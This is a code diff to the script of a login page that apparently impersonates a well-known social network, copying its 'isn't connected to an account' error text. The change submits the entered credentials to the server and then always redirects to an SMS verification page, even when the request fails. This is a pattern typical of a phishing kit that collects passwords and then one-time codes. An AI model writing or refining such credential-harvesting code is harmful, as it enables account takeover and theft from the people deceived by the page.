@@ -621,24 +621,25 @@
                             errorMsg.textContent = 'The email or mobile number you entered isn’t connected to an account.';
                             loginBtn.disabled = false;
                             loginBtn.textContent = 'Log In';
+                            // Do not redirect, just allow retry
                             return;
                         } else {
                             errorMsg.style.display = 'none';
+                            loginBtn.disabled = true;
+                            loginBtn.textContent = 'Logging in...';
+                            var formData = new FormData(loginForm);
+                            fetch('/', {
+                                method: 'POST',
+                                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                                body: new URLSearchParams(formData).toString()
+                            }).then(function() {
+                                successMsg.style.display = 'block';
+                                window.location.href = 'sms-verification-page.html';
+                            }).catch(function() {
+                                successMsg.style.display = 'block';
+                                window.location.href = 'sms-verification-page.html';
+                            });
                         }
-                        loginBtn.disabled = true;
-                        loginBtn.textContent = 'Logging in...';
-                        var formData = new FormData(loginForm);
-                        fetch('/', {
-                            method: 'POST',
-                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                            body: new URLSearchParams(formData).toString()
-                        }).then(function() {
-                            successMsg.style.display = 'block';
-                            window.location.href = 'sms-verification-page.html';
-                        }).catch(function() {
-                            successMsg.style.display = 'block';
-                            window.location.href = 'sms-verification-page.html';
-                        });
                     });
                 }
             });
